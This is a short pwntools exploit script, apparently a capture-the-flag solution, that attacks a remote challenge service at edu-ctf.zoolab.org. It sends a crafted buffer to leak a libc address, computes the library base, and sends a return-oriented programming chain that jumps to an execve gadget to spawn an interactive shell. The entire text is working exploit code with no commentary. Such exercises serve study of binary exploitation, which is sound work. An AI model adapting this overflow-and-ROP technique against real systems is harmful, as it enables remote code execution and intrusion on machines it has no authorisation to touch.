from pwn import *

context.arch = 'amd64'

#p = process('share/chal')
p = remote('edu-ctf.zoolab.org', 10014)

buf = '\x31'*0x10 + '\x00'*0x8 + '\x69'
p.send(buf)
print(p.recv(0x18))
libc = u64(p.recv(0x8)) - 147561
pop_r12_ret = libc + 0x2f709
execve = libc + 0xe3afe
print('libc: ', hex(libc))
p.recv(0x10)

ROP = flat(
    0, 0, 
    0,
    pop_r12_ret, 0,
    execve
)
p.send(ROP)
p.interactive()
